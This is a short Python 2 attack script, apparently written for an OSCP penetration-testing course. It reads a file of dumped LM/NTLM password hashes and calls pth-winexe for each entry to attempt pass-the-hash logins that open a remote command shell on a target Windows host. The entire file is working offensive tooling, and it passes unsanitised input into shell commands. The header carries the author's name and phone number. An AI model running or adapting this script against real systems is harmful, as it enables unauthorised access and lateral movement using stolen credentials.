#!/usr/bin/python
import os, operator, sys, subprocess, threading

# Chang Tan Lister
# Lister Unlimited
# 702-886-8952
# https://github.com/tanc7
# OSCP Candidate (written for the Penetration Testing with Kali Linux Course)

def bash_cmd_fg(cmd):
    subprocess.call(cmd,shell=True,executable='/bin/bash')
    print "DEBUG: called command\r\n{}".format(str(cmd))
    return

def bash_cmd_bg(cmd):
    p = subprocess.Popen(cmd,shell=True,executable='/bin/bash',stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    o = p.stdout.read()
    e = p.stderr.read()
    out = o + e
    out = str(out.encode('utf-8'))
    outlines = out.splitlines()
    for line in outlines:
        print line
    return

def passTheHashExec(USER,SMBHASH,TARGET,DOMAIN):
    # cmd = "export SMBHASH={}".format(str(SMBHASH))
    # print "DEBUG: Running %s" % str(cmd)
    # bash_cmd_fg(cmd)
    # cmd = "pth-winexe -U {}% //{} cmd".format(str(USER),str(TARGET))
    cmd = "pth-winexe -U {}%{} //{} cmd".format(str(USER),str(SMBHASH),str(TARGET))
    if DOMAIN != None:# If a specific domain was supplied
        cmd = "pth-winexe -U {}/{}%{} //{} cmd".format(str(DOMAIN),str(USER),str(SMBHASH),str(TARGET))
        print "DEBUG: Running %s" % str(cmd)
        bash_cmd_fg(cmd)
    else:
        print "DEBUG: Running %s" % str(cmd)
        bash_cmd_fg(cmd)
    return
def readHashList(HASHLIST,TARGET,DOMAIN):
    r = open(HASHLIST,'r')
    lines = r.readlines()
    for line in lines:
        splitline = line.split(':')
        USER = splitline[0]
        UID =   splitline[1]
        LM = splitline[2]
        NTLM = splitline[3]
        SMBHASH = "{}:{}".format(str(LM),str(NTLM))
        print "Loading USER={}\r\nSMBHASH={}\r\nDOMAIN={}".format(str(USER),str(SMBHASH),str(DOMAIN))
        passTheHashExec(USER,SMBHASH,TARGET,DOMAIN)
    print "Done"
    exit(0)
    return USER, SMBHASH, TARGET, DOMAIN
def main():
    if len(sys.argv) < 3:
        print "Usage: python pth-bruter <TARGET IP> <DUMPED HASH LIST> <OPTIONAL: DOMAIN>"
        exit(0)
    else:
        if len(sys.argv) == 3:
            TARGET = str(sys.argv[1])
            HASHLIST = str(sys.argv[2])
            DOMAIN = None
        if len(sys.argv) == 4:
            TARGET = str(sys.argv[1])
            HASHLIST = str(sys.argv[2])
            DOMAIN = str(sys.argv[3])
        readHashList(HASHLIST,TARGET,DOMAIN)
    return
main()